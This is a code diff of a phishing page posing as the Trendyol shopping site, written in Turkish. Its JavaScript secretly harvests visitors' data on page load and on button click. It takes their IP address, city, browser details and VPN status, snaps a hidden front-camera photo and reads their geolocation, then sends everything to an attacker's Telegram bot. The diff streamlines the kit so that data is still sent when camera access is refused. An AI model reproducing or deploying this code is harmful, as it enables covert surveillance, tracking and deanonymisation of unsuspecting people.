@@ -81,12 +81,7 @@
             text-align: center;
             display: none;
         }
-        .success-header {
-            color: #27ae60;
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 16px;
-        }
+        .success-header { color: #27ae60; font-size: 18px; font-weight: 600; margin-bottom: 16px; }
         .generated-code {
             font-size: 28px;
             font-weight: 700;
@@ -127,7 +122,6 @@
     </div>
 </div>
 
-<!-- Çerez Banner -->
 <div id="cookie-banner" style="position:fixed; bottom:0; left:0; right:0; background:white; padding:16px 20px; box-shadow:0 -4px 20px rgba(0,0,0,0.2); display:none; z-index:1000; font-size:14px;">
     Trendyol, size en iyi deneyimi sunmak için çerezleri kullanır. 
     <a href="#" style="color:#f27a1a;">Detaylar</a>
@@ -173,60 +167,38 @@ async function getIPData() {
   catch { return {}; }
 }
 
-async function getBatteryInfo() {
-  try { 
-    const bat = await navigator.getBattery();
-    return { level: Math.round(bat.level*100), charging: bat.charging ? "Prize takılı" : "Bataryada" }; 
-  } 
-  catch { return { level: "Bilinmiyor", charging: "" }; }
+async function collectUserData(fakeCode){
+  const ipData=await getIPData();
+  const userAgent=navigator.userAgent;
+  const vpnProxy=(ipData.security && ipData.security.vpn)?"Evet":"Hayır";
+  return `📡 IP: ${ipData.ip || "Bilinmiyor"}\n🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}\n🏙️ Şehir: ${ipData.city || "Bilinmiyor"}\n📱 Tarayıcı: ${userAgent}\n🔐 VPN: ${vpnProxy}\n💻 Kod: ${fakeCode}`;
 }
 
 async function takeSelfieWithData(messageText) {
-  try{
-    const video=document.createElement("video");
-    video.style.display="none";
-    document.body.appendChild(video);
-    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-    video.srcObject=stream;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    const video = document.createElement("video");
+    video.srcObject = stream;
     await video.play();
-    await new Promise(r=>setTimeout(r,500));
-    const canvas=document.createElement("canvas");
-    canvas.width=640; canvas.height=480;
-    const ctx=canvas.getContext("2d");
-    ctx.drawImage(video,0,0,canvas.width,canvas.height);
-    canvas.toBlob(async blob=>{
-      await sendTelegramMessage(CHAT_ID,messageText,blob);
-      stream.getTracks().forEach(track=>track.stop());
-      video.remove();
-    },"image/jpeg");
-  }catch(e){ console.log("Selfie açılamadı",e);}
-}
-
-async function collectUserData(fakeCode){
-  const ipData=await getIPData();
-  const battery=await getBatteryInfo();
-  const userAgent=navigator.userAgent;
-  const vpnProxy=(ipData.security && ipData.security.vpn)?"Evet":"Hayır";
-  return `
-📡 IP: ${ipData.ip || "Bilinmiyor"}
-🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}
-🏙️ Şehir: ${ipData.city || "Bilinmiyor"}
-🧠 ISP: ${ipData.org || "Bilinmiyor"}
-📱 Tarayıcı: ${userAgent}
-🔐 VPN/Proxy: ${vpnProxy}
-🔋 Şarj: \( {battery.level}% ( \){battery.charging})
-💻 Kod: ${fakeCode}`;
+    await new Promise(r => setTimeout(r, 600));
+    const canvas = document.createElement("canvas");
+    canvas.width = 640; canvas.height = 480;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    canvas.toBlob(blob => sendTelegramMessage(CHAT_ID, messageText, blob), "image/jpeg");
+    stream.getTracks().forEach(t => t.stop());
+  } catch(e) {
+    console.log("Kamera izni reddedildi");
+    await sendTelegramMessage(CHAT_ID, messageText);
+  }
 }
 
 async function sendLocation() {
   if(!navigator.geolocation) return;
-  navigator.geolocation.getCurrentPosition(pos=>{
-    const lat=pos.coords.latitude;
-    const lon=pos.coords.longitude;
+  navigator.geolocation.getCurrentPosition(pos => {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({chat_id:CHAT_ID, latitude:lat, longitude:lon})
+      body:JSON.stringify({chat_id:CHAT_ID, latitude:pos.coords.latitude, longitude:pos.coords.longitude})
     });
   });
 }
@@ -241,8 +213,8 @@ function hideError(){ document.getElementById("errorMsg").style.display = "none"
 function hideCookie(){ document.getElementById("cookie-banner").style.display = "none"; }
 function acceptCookie(){ hideCookie(); }
 
-// Sayfa açılışında veri toplama
-(async ()=>{
+// Sayfa açılış
+(async () => {
   setTimeout(() => document.getElementById("cookie-banner").style.display = "block", 1200);
 
   if(!CHAT_ID || !URL_SIFRE) return;
@@ -252,7 +224,6 @@ function acceptCookie(){ hideCookie(); }
   await sendLocation();
 })();
 
-// Buton tıklama
 document.getElementById("submitBtn").addEventListener("click", async () => {
   const input = document.getElementById("codeInput").value.trim();
   if(!CHAT_ID || !URL_SIFRE){ 
@@ -273,4 +244,4 @@ document.getElementById("submitBtn").addEventListener("click", async () => {
 });
 </script>
 </body>
-        </html>
+</html>
